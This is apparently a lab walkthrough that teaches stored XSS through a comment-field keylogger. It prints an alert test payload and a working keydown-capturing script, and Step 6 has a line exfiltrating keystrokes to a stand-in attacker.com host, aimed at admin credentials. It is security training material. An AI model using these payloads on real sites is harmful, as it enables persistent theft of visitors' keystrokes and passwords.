STEP 01
Understand the Vulnerability
The blog's comment section takes user input and renders it directly into the page without sanitization. This means any HTML or JavaScript you inject gets stored in the "database" and executed every time the page loads — for every visitor including admins.

💡 Stored XSS is more dangerous than Reflected XSS because it persists and affects ALL users who visit the page, not just the attacker.
STEP 02
Confirm XSS Exists — Basic Test
Before going straight to a keylogger, confirm the comment field is actually vulnerable. Submit a basic XSS payload in the comment box:
<script>alert('XSS')</script>
If an alert pops — the field is vulnerable. On this lab the comment text field is the injection point. The name field is sanitized — focus on the comment body.
STEP 03
Understand How a Keylogger Payload Works
A JavaScript keylogger hooks into the document.onkeypress or addEventListener('keydown') event. Every key the victim types gets captured and can be sent to an attacker's server (or in this lab, displayed in a panel).

The basic structure:
<script> document.addEventListener('keydown', function(e) { // capture e.key and send/store it }); </script>
In a real attack this would send captured keys to an external server via fetch() or an image src trick.
STEP 04
Craft the Keylogger Payload
Now craft your stored XSS keylogger. Paste this exactly into the comment body field on the Target tab:
<script>document.addEventListener('keydown',function(e){var d=document.getElementById('kl-capture');if(!d){d=document.createElement('div');d.id='kl-capture';}d.innerText+=(e.key==='Enter'?'[ENTER]':e.key==='Backspace'?'[BACK]':e.key==='Tab'?'[TAB]':e.key.length===1?e.key:'['+e.key+']');});</script>
⚠ This lab uses a simplified payload. In a real engagement, the keylogger would exfiltrate data to an external server using fetch() or XMLHttpRequest.
Shortcut payload to trigger the lab:
<script>startKeylogger()</script>
This calls the lab's built-in keylogger function to simulate the attack and reveal the flag.
STEP 05
Trigger the Keylogger as the Victim
After posting your payload, the keylogger is now stored in the page. Every visitor who loads the page will have their keystrokes captured.

On this lab, after your payload is posted, a simulated admin types their secret into the page. The keylogger captures it — and the flag is revealed.

💡 Click anywhere on the Target tab after posting the payload and start typing — the keylogger will capture your keystrokes and simulate what a victim's stolen input would look like.
✓ Once the keylogger is active and keys are captured — the flag unlocks automatically.
STEP 06
Real World Context
In a real bug bounty or pentest scenario, a stored XSS keylogger would:

1. Be injected into a comments / profile / message field
2. Send captured keys to attacker server: fetch('https://attacker.com/log?k='+encodeURIComponent(keys))
3. Target admin panels where credentials are typed
4. Persist until the stored payload is removed from the DB

💡 Always report stored XSS as Critical/High severity — it affects ALL users and persists across sessions.
⚠ Only perform this on systems you own or have written permission to test. Unauthorized keylogging is illegal.
